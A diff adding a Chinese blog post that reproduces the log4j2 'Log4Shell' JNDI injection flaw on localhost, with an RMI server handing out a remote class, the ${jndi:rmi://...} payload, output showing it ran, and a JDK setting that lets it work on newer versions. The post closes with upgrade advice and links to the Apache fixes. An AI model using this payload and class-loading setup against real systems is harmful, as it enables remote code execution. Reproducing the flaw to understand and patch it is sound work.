@@ -18494,4 +18494,46 @@ D_{KL}(p||q) = \sum_{i=1}^{N} p(x_i)\cdot log\frac{p(x_i)}{q(x_i)}</script><p>�
         <tag>http</tag>
       </tags>
   </entry>
+  <entry>
+    <title>log4j2 lookups issues</title>
+    <url>/2021/12/20/log4j2-lookups-issues/</url>
+    <content><![CDATA[<p>2021-12-10 上上周五，log4j2爆出一个严重的代码注入漏洞。<br><a href="https://mp.weixin.qq.com/s/Yq9k1eBquz3mM1sCinneiA" target="_blank" rel="noopener">突发！Log4j 爆“核弹级”漏洞，Flink、Kafka等至少十多个项目受影响</a></p>
+<p>看完报道，感觉挺严重，抱着试试看的心态打开intellij想复现表达式注入，结果失败了。<br>表达式并没有被执行，而是字符串打印了出来，当时下意识感觉和jdk版本有关联，后边证实了我的想法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.info(<span class="string">"hello &#123;&#125;"</span>, <span class="string">"$&#123;java:os&#125;"</span>);</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>上周刷视频看到有人介绍这个漏洞，跟着复现了一遍jndi-rmi注入攻击。</p>
+<p><a href="https://b23.tv/uAjd6vy" target="_blank" rel="noopener">Log4j高危漏洞！具体原因解析！全网第一！-哔哩哔哩</a><br><a href="https://b23.tv/QVL4fwH" target="_blank" rel="noopener">Log4j高危漏洞 (补充视频)-哔哩哔哩</a></p>
+<h2 id="rmi-恶意代码服务器"><a href="#rmi-恶意代码服务器" class="headerlink" title="rmi 恶意代码服务器"></a>rmi 恶意代码服务器</h2><p>先写个恶意类，注意不要带包路径<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObj</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">"Hi i'm evil"</span>);</span><br><span class="line">        <span class="comment">// TODO evil things</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>再搞个rmi服务<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1019</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">1019</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(</span><br><span class="line">                <span class="keyword">new</span> Reference(<span class="string">"EvilObj"</span>, <span class="string">"EvilObj"</span>, <span class="string">"http://127.0.0.1:8000/"</span>));</span><br><span class="line">        registry.bind(<span class="string">"evil"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><code>Reference</code> 构造方法的前两个参数为类名和工厂名<code>EvilObj</code></li>
+<li><code>Reference</code> 构造方法的第三个参数<code>http://127.0.0.1:8000/</code>为类文件的获取地址<br>  这里我用的是python 2.7命令 <code>python -m SimpleHTTPServer</code></li>
+<li><code>registry</code> 绑定参数<code>evil</code>是rmi接口的上下文</li>
+</ul>
+<p>启动主类<code>App</code>，再在classes编译目录下为<code>EvilObj.class</code>启动文件服务器。<br>至此恶意代码服务器部分就告一段落，它主要用来给注入代码打配合，让目标服务器<strong>加载运行远程代码</strong>。</p>
+<h2 id="单元测试模拟被注入服务器"><a href="#单元测试模拟被注入服务器" class="headerlink" title="单元测试模拟被注入服务器"></a>单元测试模拟被注入服务器</h2><p>在第二个补充视频的评论区发现，漏洞确实和jdk版本有关<br>继续查资料，在<a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">JAVA JNDI注入知识详解</a>中看到：</p>
+<blockquote>
+<p>在jdk8u121 7u131 6u141版本开始默认com.sun.jndi.rmi.object.trustURLCodebase设置为false,rmi加载远程的字节码不会执行成功。</p>
+</blockquote>
+<h3 id="低版本log4j2-低版本jdk"><a href="#低版本log4j2-低版本jdk" class="headerlink" title="低版本log4j2 + 低版本jdk"></a>低版本log4j2 + 低版本jdk</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* java:   1.7.0_80-b15</span></span><br><span class="line"><span class="comment">* log4j2: 2.10.0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String rmi = <span class="string">"$&#123;jndi:rmi://127.0.0.1:1019/evil&#125;"</span>;</span><br><span class="line">logger.info(<span class="string">"remote &#123;&#125;"</span>, rmi);</span><br></pre></td></tr></table></figure>
+<p>控制台输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi i&apos;m evil</span><br><span class="line">[INFO ] B.log4j2 remote $&#123;jndi:rmi://127.0.0.1:1019/evil&#125;</span><br></pre></td></tr></table></figure></p>
+<p>成功注入恶意代码</p>
+<h3 id="低版本log4j2-高版本jdk"><a href="#低版本log4j2-高版本jdk" class="headerlink" title="低版本log4j2 + 高版本jdk"></a>低版本log4j2 + 高版本jdk</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">String exp = <span class="string">"$&#123;jndi:rmi://127.0.0.1:1019/evil&#125;"</span>;</span><br><span class="line">logger.info(<span class="string">"remote &#123;&#125;"</span>, exp);</span><br></pre></td></tr></table></figure>
+<p>主动设置rmi系统属性后，高版本jdk下依然可以对低版本log4j2注入代码</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这确实是个非常严重的漏洞，鉴于log4j的广泛应用，有较高的概率会中招。<br>如果工程使用log4j2的版本低于2.15.0，请务必要尽快升级。<br>如果工程使用jdk版本过低，由于2.15.0需要jdk8，jdk/jre也必须要升级以修复漏洞。</p>
+<p>—<br><strong>Issue</strong></p>
+<p><a href="https://issues.apache.org/jira/browse/LOG4J2-3198" target="_blank" rel="noopener">LOG4J2-3198: Message lookups should be disabled by default</a><br><a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;h=04637dd" target="_blank" rel="noopener">https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;h=04637dd</a></p>
+<p><a href="https://issues.apache.org/jira/browse/LOG4J2-3201" target="_blank" rel="noopener">LOG4J2-3201: Limit the protocols JNDI can use and restrict LDAP.</a><br><a href="https://issues.apache.org/jira/browse/LOG4J2-3202" target="_blank" rel="noopener">LOG4J2-3202: Only allow lookups in message, not in parameters.</a></p>
+<p>—<br><strong>Manual</strong></p>
+<p><a href="https://logging.apache.org/log4j/2.x/changes-report.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/changes-report.html</a><br><a href="https://logging.apache.org/log4j/2.x/manual/appenders.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/manual/appenders.html</a><br><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p>
+<p>—<br><strong>Code</strong></p>
+<p><a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">JAVA JNDI注入知识详解</a><br><a href="https://github.com/BurningBright/poc/tree/master/log4j" target="_blank" rel="noopener">https://github.com/BurningBright/poc/tree/master/log4j</a></p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>bug</tag>
+      </tags>
+  </entry>
 </search>
